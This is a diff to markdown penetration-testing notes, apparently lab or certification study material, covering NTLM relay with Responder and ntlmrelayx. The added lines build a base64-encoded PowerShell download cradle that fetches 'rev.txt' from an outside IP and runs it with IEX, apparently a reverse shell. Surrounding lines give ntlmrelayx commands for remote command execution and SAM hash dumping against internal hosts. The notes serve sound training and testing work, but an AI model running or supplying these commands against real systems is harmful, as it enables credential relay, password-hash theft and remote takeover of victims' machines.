@@ -216,9 +216,18 @@ Retrieving password from the linked server:
 ## NTLM Relay:
 *Notes: three tools involved: Responder,ntlmrelayx and mssqlpwner/impacket, also, make sure the user authenticating to us have local admin access to the desired target*
 
+Prepare BASE64 command to execute:
+
+```
+$text = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.229/rev.txt') | IEX"
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
+$EncodedText = [Convert]::ToBase64String($bytes)
+$EncodedText
+```
+
 <ins>Set up NTLM Relay</ins>:
 
-- Command Execution: `ntlmrelayx.py --no-http-server -smb2support -t 192.168.156.6 -c 'command here'`
+- Command Execution: `ntlmrelayx.py --no-http-server -smb2support -t 192.168.156.6 -c 'command/base64 blob here'`
 - SAM Dump: `ntlmrelayx.py --no-http-server -smb2support -t smb://172.16.192.152`
 
 <ins>Fire up Responder</ins>
